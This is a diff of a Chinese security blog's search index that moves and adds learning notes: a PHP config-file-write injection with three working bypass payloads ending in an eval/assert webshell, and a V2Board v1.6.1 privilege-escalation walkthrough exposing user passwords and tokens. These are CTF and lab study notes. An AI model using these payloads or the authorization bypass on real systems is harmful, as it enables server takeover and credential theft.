@@ -906,7 +906,7 @@ handler 指向RequestHandler
       </tags>
   </entry>
   <entry>
-    <title>漏洞学习</title>
+    <title>CVE漏洞</title>
     <url>/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/</url>
     <content><![CDATA[<p><strong><code>想把一些常见的CVE以及一些经典漏洞复现，做做笔记</code></strong></p>
 <h1 id="CVE-2021-44228"><a href="#CVE-2021-44228" class="headerlink" title="CVE-2021-44228"></a>CVE-2021-44228</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Apache</span> Log4j2 是一个被广泛使用的开源日志记录库，<span class="number">2017</span> 年 <span class="number">7</span> 月时，有人向 Log4j2 提了支持 JNDI Lookup 的需求，并从 <span class="number">2</span>.<span class="number">0</span>-beta9 之后开始支持；今年阿里的安全研究人员发现该特性会导致远程代码执行，于 <span class="number">2021</span> 年 <span class="number">11</span> 月 <span class="number">24</span> 日向 Apache 报告了该漏洞；<span class="number">12</span> 月 <span class="number">5</span> 日官方发布了补丁；到了 <span class="number">12</span> 月 <span class="number">9</span> 日晚，PoC 的传播范围开始变得不可控，基本上各大厂商都受影响，影响范围很广，于是人们给它起了个名字——Log4Shell。</span><br></pre></td></tr></table></figure>
@@ -1130,68 +1130,6 @@ handler 指向RequestHandler
 <p>成功反弹到<code>shell</code></p>
 <p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221221203538282.png" alt="image-20221221203538282"></p>
 <p>测试完毕</p>
-<h1 id="PHP写入配置文件的经典漏洞"><a href="#PHP写入配置文件的经典漏洞" class="headerlink" title="PHP写入配置文件的经典漏洞"></a>PHP写入配置文件的经典漏洞</h1><p>在一个比赛中了解到的一个漏洞，关键在于绕过函数从而包含</p>
-<p><a href="https://bbs.zkaq.cn/t/6045.html">转载文章</a></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">`<span class="meta">&lt;?php</span>`</span><br><span class="line">`<span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;option&#x27;</span>])) <span class="keyword">die</span>();</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;option&#x27;</span>]);`</span><br><span class="line">`<span class="variable">$file</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./config.php&#x27;</span>);`</span><br><span class="line">`<span class="variable">$file</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;|\$option=\&#x27;.*\&#x27;;|&#x27;</span>, <span class="string">&quot;\$option=&#x27;<span class="subst">$str</span>&#x27;;&quot;</span>, <span class="variable">$file</span>);`</span><br><span class="line">`<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;./config.php&#x27;</span>, <span class="variable">$file</span>);</span><br></pre></td></tr></table></figure>
-
-
-<p><code>config.php</code> 的内容如下:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;test&#x27;</span>;</span><br></pre></td></tr></table></figure>
-
-
-<p>要求是要<code>getshell</code>,这个场景十分经典，常用在修改配置文件写入的时候。<br>此处不存在之前说的那个配置文件中用的是<code>”双引号”</code>引起任意代码执行的问题,这这里面用的是单引号,而且 <code>addslashes()</code>处理过了,看似很安全,但是对于脑子里有个黑洞的搞安全的人来讲,这个还真是有问题的.</p>
-<h2 id="方法一-利用换行符来绕过正则匹配的问题"><a href="#方法一-利用换行符来绕过正则匹配的问题" class="headerlink" title="方法一,利用换行符来绕过正则匹配的问题"></a>方法一,利用换行符来绕过正则匹配的问题</h2><p>可以看到正则匹配的是以下内容:</p>
-<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="symbol">$optio</span>n=<span class="string">&#x27;任意内容&#x27;</span></span><br></pre></td></tr></table></figure>
-
-
-<p>任意内容里面是可以包含转移符 <code>\</code> 的,所以我们利用下面的方法:</p>
-<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//127.0.0.1/index.php?option=a&#x27;;%0aphpinfo();//</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//127.0.0.1/index.php?option=a</span></span><br></pre></td></tr></table></figure>
-
-
-<p>执行完第一个之后,<code>config.php</code>中的内容为:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;a\&#x27;;</span></span><br><span class="line"><span class="string">phpinfo();//&#x27;</span>;</span><br></pre></td></tr></table></figure>
-
-<p>但是这样并没有办法执行<code>phpinfo()</code>,因为我们插入的 单引号 被转移掉了,所以<code>phpinfo()</code>还是在单引号的包裹之内.<br>我们在访问下面这个</p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span>/index.php?option=a</span><br></pre></td></tr></table></figure>
-
-
-<p>因为正则 <code>.*</code> 会匹配行内的任意字符无数次.所以 <code>\</code> 也被认为是其中的一部分,也会被替换掉,执行完之后,<code>config.php</code>中的内容为:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();<span class="comment">//&#x27;;</span></span><br></pre></td></tr></table></figure>
-
-
-<p>转义符就被替换掉了,就成功的<code>getshell</code>.</p>
-<h2 id="方法二-利用-preg-replace函数的问题"><a href="#方法二-利用-preg-replace函数的问题" class="headerlink" title="方法二,利用 preg_replace函数的问题:"></a>方法二,利用 preg_replace函数的问题:</h2><p>用<code>preg_replace()</code>的时候<code>replacement(第二个参数)</code>也要经过正则引擎处理，所以正则引擎把<code>\\</code>转义成了<code>\</code><br>也就是说如果字符串是<code>\\\&amp;#39;</code>,经过 <code>preg_replace()</code>的处理,就变为 <code>#39;</code>,单引号就逃出来了.<br>所以<code>payload</code>如下:</p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/index.php?option=a\&#x27;;phpinfo();/</span><span class="regexp">/</span></span><br></pre></td></tr></table></figure>
-
-
-<p><code>config.php</code>变为:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;a\\&#x27;</span>;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">//&#x27;;</span></span><br></pre></td></tr></table></figure>
-
-<p>**道理就是  <code>a\&amp;#39;;phpinfo();//</code>  经过 <code>addslashes()</code>处理之后,变为<code>a\\\&amp;#39;;phpinfo();//</code> 然后两个反斜杠被<code>preg_replace</code>变成了一个,导致单引号逃脱.</p>
-<h2 id="方法三-利用-preg-replace-函数的第二个参数的问题"><a href="#方法三-利用-preg-replace-函数的第二个参数的问题" class="headerlink" title="方法三, 利用 preg_replace() 函数的第二个参数的问题"></a>方法三, 利用 preg_replace() 函数的第二个参数的问题</h2><p>先看官方对<code>preg_replace()</code>函数的描述<code>manual</code><br>函数原型:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">xed <span class="title function_ invoke__">preg_replace</span> ( <span class="keyword">mixed</span> <span class="variable">$pattern</span> , <span class="keyword">mixed</span> <span class="variable">$replacement</span> , <span class="keyword">mixed</span> <span class="variable">$subject</span> [, <span class="keyword">int</span> <span class="variable">$limit</span> = -<span class="number">1</span> [, <span class="keyword">int</span> &amp;<span class="variable">$count</span> ]] )</span><br></pre></td></tr></table></figure>
-
-
-<p>对<code>replacement</code>的描述.<br><code>replacement</code>中可以包含后</p>
-<p>向<code>引用\\n或(php 4.0.4以上可用)$n</code>，语法上首选后者。 每个 这样的引用将被匹配到的第<code>n</code>个捕获子组捕获到的文本替换。 <code>n</code> 可以是<code>0-99</code>，<code>\\0</code>和<code>$0</code>代表完整的模式匹配文本。</p>
-<p>所以我们可以用:</p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/test/</span>ph.php?option=;phpinfo();</span><br><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/test/</span>ph.php?option= 或者 http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/test/</span>ph.php?option=<span class="variable">$0</span></span><br></pre></td></tr></table></figure>
-
-
-<p>执行第一条后<code>config.php</code>的内容为:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;;phpinfo();&#x27;</span>;</span><br></pre></td></tr></table></figure>
-
-
-<p>再执行第二条后<code>config.php</code>的内容为:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;$option=&#x27;</span>;<span class="title function_ invoke__">phpinfo</span>();<span class="string">&#x27;;&#x27;</span>;</span><br></pre></td></tr></table></figure>
-
-
-<p>刚好闭合掉了前后的两个单引号中间的逃脱出来了.想出这个办法的人,思路真是可以的.</p>
-<hr>
-<p>要<code>getshell</code>直接</p>
-<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">把<span class="built_in">phpinfo</span>()替换成</span><br><span class="line"><span class="function"><span class="title">eval</span><span class="params">($_REQUEST[<span class="number">123</span>])</span></span></span><br><span class="line"><span class="function"><span class="title">assert</span><span class="params">($_REQUEST[<span class="number">123</span>])</span></span></span><br><span class="line">蚁剑连接即可</span><br></pre></td></tr></table></figure>
-
-<hr>
 ]]></content>
       <categories>
         <category>网络安全学习</category>
@@ -4286,10 +4224,10 @@ msfvenom -l encoders #列出所有的编码器
       </tags>
   </entry>
   <entry>
-    <title>CMS分析</title>
+    <title>漏洞测试</title>
     <url>/2022/11/22/SYC/</url>
-    <content><![CDATA[<p><code>训练一下自己的代码审计能力，了解一些开源的cms框架的漏洞形成原因，并自己尝试复现</code></p>
-<h1 id="漫城CMS"><a href="#漫城CMS" class="headerlink" title="漫城CMS"></a>漫城CMS</h1><h2 id="环境搭建phpstudy"><a href="#环境搭建phpstudy" class="headerlink" title="环境搭建phpstudy"></a>环境搭建<code>phpstudy</code></h2><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Apache</span> <span class="number">2</span>.<span class="number">4</span>.<span class="number">43</span></span><br><span class="line"><span class="attribute">MySQL</span> <span class="number">8</span>.<span class="number">0</span>.<span class="number">12</span></span><br><span class="line"><span class="attribute">php</span> <span class="number">7</span>.<span class="number">3</span>.<span class="number">4</span></span><br></pre></td></tr></table></figure>
+    <content><![CDATA[<p><code>训练一下自己的代码审计能力，了解一些开源框架的漏洞形成原因，并自己尝试复现</code></p>
+<h1 id="漫城CMS-v2-5-8漏洞分析"><a href="#漫城CMS-v2-5-8漏洞分析" class="headerlink" title="漫城CMS v2.5.8漏洞分析"></a>漫城CMS v2.5.8漏洞分析</h1><h2 id="环境搭建phpstudy"><a href="#环境搭建phpstudy" class="headerlink" title="环境搭建phpstudy"></a>环境搭建<code>phpstudy</code></h2><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Apache</span> <span class="number">2</span>.<span class="number">4</span>.<span class="number">43</span></span><br><span class="line"><span class="attribute">MySQL</span> <span class="number">8</span>.<span class="number">0</span>.<span class="number">12</span></span><br><span class="line"><span class="attribute">php</span> <span class="number">7</span>.<span class="number">3</span>.<span class="number">4</span></span><br></pre></td></tr></table></figure>
 
 <h3 id="管理员页面"><a href="#管理员页面" class="headerlink" title="管理员页面"></a>管理员页面</h3><p><img src="/2022/11/22/SYC/image-20221122144520325.png" alt="image-20221122144520325"></p>
 <h3 id="主页"><a href="#主页" class="headerlink" title="主页"></a>主页</h3><p><img src="/2022/11/22/SYC/image-20221122144602259.png" alt="image-20221122144602259"></p>
@@ -4588,6 +4526,102 @@ msfvenom -l encoders #列出所有的编码器
 <p>原来是直接用<code>fwrite</code>写入文件，而字符开始就被<code>html</code>转义了，所以写入的结果肯定是转义后的结果</p>
 <h4 id="猜测"><a href="#猜测" class="headerlink" title="猜测"></a>猜测</h4><figure class="highlight"><table><tr><td class="code"><pre><span class="line">可能是存在参数变量可以被代码执行函数覆盖，再通过与其他参数结合，实现命令执行</span><br></pre></td></tr></table></figure>
 
+<p>测试完成</p>
+<h1 id="PHP写入配置文件的经典漏洞"><a href="#PHP写入配置文件的经典漏洞" class="headerlink" title="PHP写入配置文件的经典漏洞"></a>PHP写入配置文件的经典漏洞</h1><p>在一个比赛中了解到的一个漏洞，关键在于绕过函数从而包含</p>
+<p><a href="https://bbs.zkaq.cn/t/6045.html">转载文章</a></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">`<span class="meta">&lt;?php</span>`</span><br><span class="line">`<span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;option&#x27;</span>])) <span class="keyword">die</span>();</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;option&#x27;</span>]);`</span><br><span class="line">`<span class="variable">$file</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./config.php&#x27;</span>);`</span><br><span class="line">`<span class="variable">$file</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;|\$option=\&#x27;.*\&#x27;;|&#x27;</span>, <span class="string">&quot;\$option=&#x27;<span class="subst">$str</span>&#x27;;&quot;</span>, <span class="variable">$file</span>);`</span><br><span class="line">`<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;./config.php&#x27;</span>, <span class="variable">$file</span>);</span><br></pre></td></tr></table></figure>
+
+
+<p><code>config.php</code> 的内容如下:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;test&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>要求是要<code>getshell</code>,这个场景十分经典，常用在修改配置文件写入的时候。<br>此处不存在之前说的那个配置文件中用的是<code>”双引号”</code>引起任意代码执行的问题,这这里面用的是单引号,而且 <code>addslashes()</code>处理过了,看似很安全,但是对于脑子里有个黑洞的搞安全的人来讲,这个还真是有问题的.</p>
+<h2 id="方法一-利用换行符来绕过正则匹配的问题"><a href="#方法一-利用换行符来绕过正则匹配的问题" class="headerlink" title="方法一,利用换行符来绕过正则匹配的问题"></a>方法一,利用换行符来绕过正则匹配的问题</h2><p>可以看到正则匹配的是以下内容:</p>
+<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="symbol">$optio</span>n=<span class="string">&#x27;任意内容&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+<p>任意内容里面是可以包含转移符 <code>\</code> 的,所以我们利用下面的方法:</p>
+<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//127.0.0.1/index.php?option=a&#x27;;%0aphpinfo();//</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//127.0.0.1/index.php?option=a</span></span><br></pre></td></tr></table></figure>
+
+
+<p>执行完第一个之后,<code>config.php</code>中的内容为:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;a\&#x27;;</span></span><br><span class="line"><span class="string">phpinfo();//&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>但是这样并没有办法执行<code>phpinfo()</code>,因为我们插入的 单引号 被转移掉了,所以<code>phpinfo()</code>还是在单引号的包裹之内.<br>我们在访问下面这个</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span>/index.php?option=a</span><br></pre></td></tr></table></figure>
+
+
+<p>因为正则 <code>.*</code> 会匹配行内的任意字符无数次.所以 <code>\</code> 也被认为是其中的一部分,也会被替换掉,执行完之后,<code>config.php</code>中的内容为:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();<span class="comment">//&#x27;;</span></span><br></pre></td></tr></table></figure>
+
+
+<p>转义符就被替换掉了,就成功的<code>getshell</code>.</p>
+<h2 id="方法二-利用-preg-replace函数的问题"><a href="#方法二-利用-preg-replace函数的问题" class="headerlink" title="方法二,利用 preg_replace函数的问题:"></a>方法二,利用 preg_replace函数的问题:</h2><p>用<code>preg_replace()</code>的时候<code>replacement(第二个参数)</code>也要经过正则引擎处理，所以正则引擎把<code>\\</code>转义成了<code>\</code><br>也就是说如果字符串是<code>\\\&amp;#39;</code>,经过 <code>preg_replace()</code>的处理,就变为 <code>#39;</code>,单引号就逃出来了.<br>所以<code>payload</code>如下:</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/index.php?option=a\&#x27;;phpinfo();/</span><span class="regexp">/</span></span><br></pre></td></tr></table></figure>
+
+
+<p><code>config.php</code>变为:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;a\\&#x27;</span>;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">//&#x27;;</span></span><br></pre></td></tr></table></figure>
+
+<p>**道理就是  <code>a\&amp;#39;;phpinfo();//</code>  经过 <code>addslashes()</code>处理之后,变为<code>a\\\&amp;#39;;phpinfo();//</code> 然后两个反斜杠被<code>preg_replace</code>变成了一个,导致单引号逃脱.</p>
+<h2 id="方法三-利用-preg-replace-函数的第二个参数的问题"><a href="#方法三-利用-preg-replace-函数的第二个参数的问题" class="headerlink" title="方法三, 利用 preg_replace() 函数的第二个参数的问题"></a>方法三, 利用 preg_replace() 函数的第二个参数的问题</h2><p>先看官方对<code>preg_replace()</code>函数的描述<code>manual</code><br>函数原型:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">xed <span class="title function_ invoke__">preg_replace</span> ( <span class="keyword">mixed</span> <span class="variable">$pattern</span> , <span class="keyword">mixed</span> <span class="variable">$replacement</span> , <span class="keyword">mixed</span> <span class="variable">$subject</span> [, <span class="keyword">int</span> <span class="variable">$limit</span> = -<span class="number">1</span> [, <span class="keyword">int</span> &amp;<span class="variable">$count</span> ]] )</span><br></pre></td></tr></table></figure>
+
+
+<p>对<code>replacement</code>的描述.<br><code>replacement</code>中可以包含后</p>
+<p>向<code>引用\\n或(php 4.0.4以上可用)$n</code>，语法上首选后者。 每个 这样的引用将被匹配到的第<code>n</code>个捕获子组捕获到的文本替换。 <code>n</code> 可以是<code>0-99</code>，<code>\\0</code>和<code>$0</code>代表完整的模式匹配文本。</p>
+<p>所以我们可以用:</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/test/</span>ph.php?option=;phpinfo();</span><br><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/test/</span>ph.php?option= 或者 http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/test/</span>ph.php?option=<span class="variable">$0</span></span><br></pre></td></tr></table></figure>
+
+
+<p>执行第一条后<code>config.php</code>的内容为:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;;phpinfo();&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+
+<p>再执行第二条后<code>config.php</code>的内容为:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;$option=&#x27;</span>;<span class="title function_ invoke__">phpinfo</span>();<span class="string">&#x27;;&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+
+<p>刚好闭合掉了前后的两个单引号中间的逃脱出来了.想出这个办法的人,思路真是可以的.</p>
+<hr>
+<p>要<code>getshell</code>直接</p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">把<span class="built_in">phpinfo</span>()替换成</span><br><span class="line"><span class="function"><span class="title">eval</span><span class="params">($_REQUEST[<span class="number">123</span>])</span></span></span><br><span class="line"><span class="function"><span class="title">assert</span><span class="params">($_REQUEST[<span class="number">123</span>])</span></span></span><br><span class="line">蚁剑连接即可</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="V2Board-v1-6-1-越权访问漏洞"><a href="#V2Board-v1-6-1-越权访问漏洞" class="headerlink" title="V2Board  v1.6.1 越权访问漏洞"></a>V2Board  v1.6.1 越权访问漏洞</h1><p>这是在某次比赛遇到的一道题，只拿了题目专门来记录这个漏洞，并没下载代码测试</p>
+<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a><strong>漏洞描述</strong></h2><p><code>V2board</code>面板 <code>Admin.php</code> 存在越权访问漏洞，由于部分鉴权代码于<code>v1.6.1</code>版本进行了修改，鉴权方式变为从<code>Redis</code>中获取缓存判定是否存在可以调用接口，导致任意用户都可以调用管理员权限的接口获取后台权限</p>
+<p>也就是说它是从缓存中来判断权限，一旦判断成功，就可以以<code>admin</code>身份去访问其他不可访问的敏感内容，比如<code>admin</code>的密码等等</p>
+<h2 id="漏洞代码分析"><a href="#漏洞代码分析" class="headerlink" title="漏洞代码分析"></a>漏洞代码分析</h2><p>代码位置：<code>app/Http/Middleware/Admin.php</code></p>
+<p><img src="/2022/11/22/SYC/image-20230113161644874.png" alt="image-20230113161644874"></p>
+<p>这里的代码就是判断<code>redis</code>缓存中是否存在<code>authorization</code>，如果存在就允许调用<code>admin</code>的接口，所以一旦存在</p>
+<p><code>authorization</code>就可以调用该接口，但是并没用进一步判断<code>authorization</code>中是否属于<code>admin</code></p>
+<p>主要要通过两次逻辑实现验证，一个是存在 <code>header</code> 中的 <code>authorization</code> 参数，再一个是校验 <code>authorizations</code> 是否存在于<code>Redis</code>缓存中的</p>
+<p>在返回包数据中，</p>
+<p><img src="/2022/11/22/SYC/image-20230113165445597.png" alt="image-20230113165445597"></p>
+<p>这里可以看到，这里在登录时会返回<code>token</code>，<code>auth_data</code></p>
+<p>而<code>auth_data</code>和<code>authorization</code>两个格式都是一样的<code>base64_encode(&quot;username:password&quot;)</code></p>
+<p>但是一个普通用户，一个管理员用户，这里就可能存在逻辑漏洞越权</p>
+<h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><p>先进行注册一个普通权限的</p>
+<p><img src="/2022/11/22/SYC/image-20230113161201687.png" alt="image-20230113161201687"></p>
+<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">账号：<span class="symbol">123@</span>qq.com</span><br><span class="line">密码：<span class="number">123456789</span></span><br></pre></td></tr></table></figure>
+
+<p>在登录时进行抓包</p>
+<p>返回包会返回我们的<code>token</code>和<code>auth_data</code></p>
+<p><img src="/2022/11/22/SYC/image-20230113165230066.png" alt="image-20230113165230066"></p>
+<p>同时 <code>auth_data</code> 会缓存于 <code>Redis</code> 中</p>
+<p>但是还是需要把这个<code>auth_data</code>写进<code>authorization</code></p>
+<p>如果不写入直接访问<code>/admin</code>就会弹出禁止，因为在缓存中普通用户的数据是以<code>auth_data</code>，</p>
+<p><img src="/2022/11/22/SYC/image-20230113171237926.png" alt="image-20230113171237926"></p>
+<p>所以通过下面访问<code>/api/v1/user/info</code>，当然访问其他位置也可以，只要能把<code>authorization</code>参数把普通用户数据添加到请求体中，并且成功发送</p>
+<p>从而普通用户的数据也以<code>authorization</code>参数形式保存到<code>redis</code>缓存中去了</p>
+<p><img src="/2022/11/22/SYC/image-20230113172957033.png" alt="image-20230113172957033"></p>
+<p>如何我们就可以访问<code>admin</code>才可以访问的信息</p>
+<p>比如<code>/api/v1/admin/user/fetch</code>，这就是以<code>admin</code>查看访问<code>user</code>的信息</p>
+<p><img src="/2022/11/22/SYC/image-20230113180827350.png" alt="image-20230113180827350"></p>
+<p>成功访问</p>
+<p>并且得到<code>email</code>,<code>password</code>,<code>token</code>等信息</p>
+<p><img src="/2022/11/22/SYC/image-20230113180921938.png" alt="image-20230113180921938"></p>
+<p>测试完成</p>
 ]]></content>
       <categories>
         <category>网络安全学习</category>
